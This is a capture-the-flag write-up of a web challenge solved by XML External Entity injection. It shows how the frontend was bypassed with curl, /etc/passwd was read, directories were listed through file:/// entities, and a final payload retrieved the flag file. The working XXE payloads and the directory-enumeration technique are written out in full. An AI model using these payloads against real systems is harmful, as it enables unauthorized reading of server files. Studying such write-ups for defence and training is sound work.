# Archived (XXE) — "Relic Society"
* **Platform/Event:** PWNZONE-26 / SAFCTF
* **Category:** Web (XML External Entity injection)
* **Difficulty:** Medium
* **Flag:** `safctf{…}` — value not recorded in the source notes; flag file was `/flag8b9d5b8e264a.txt`

## Objective
Abuse a "Fetch User Data" form that builds raw XML client-side (`<request><id>${userId}</id></request>`) to read arbitrary files from the server and find the flag.

## Reconnaissance & Methodology
1. Tools used: browser source view, `curl` with `Content-Type: application/xml`; XXE payloads using `file:///` entities.
2. IDs 1–4 returned valid users (looks like IDOR) — a red herring; the real bug was XXE.
3. Injecting through the form field failed because the JS template appended its own closing tags → `{"message":"Invalid input"}`.
4. Bypassed the frontend with a raw `curl` POST: `<!DOCTYPE request [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>` → `/etc/passwd` returned inside `<id>`. XXE confirmed.
5. Guessed `/home/ctfuser/flag.txt` and `/app/flag.txt` (not found); listed `file:///home/ctfuser/` (only `.bash_logout`, `.bashrc`, `.profile`, `app.jar`); listed `file:///` → revealed `flag8b9d5b8e264a.txt` at the filesystem root.

## Solution & Exploitation
* Final payload:
  ```bash
  curl -s -X POST http://54.72.82.22:8230/fetch_user \
    -H "Content-Type: application/xml" \
    --data '<?xml version="1.0"?>
  <!DOCTYPE request [<!ENTITY xxe SYSTEM "file:///flag8b9d5b8e264a.txt">]>
  <request><id>&xxe;</id></request>'
  ```
* Directory listing via `file:///` is the key move when flag-path guesses fail — XXE external entities can enumerate as well as read.
* Root cause: the backend parsed client-supplied XML without disabling external entity resolution.
